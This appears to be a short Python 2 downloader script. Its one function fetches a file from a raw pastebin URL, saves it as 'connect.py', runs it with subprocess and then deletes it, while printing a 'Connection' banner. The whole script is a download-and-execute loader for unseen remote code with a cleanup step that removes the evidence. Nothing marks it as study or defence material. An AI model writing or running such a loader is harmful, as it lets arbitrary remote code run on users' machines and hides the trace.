import os
import urllib
import subprocess

filz = "http://pastebin.com/raw/qNjByHqW"

def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
	testfile.retrieve(filz, "connect.py")
	ls_output=subprocess.Popen(["python", "connect.py"], stdout=subprocess.PIPE)
	os.remove("connect.py")
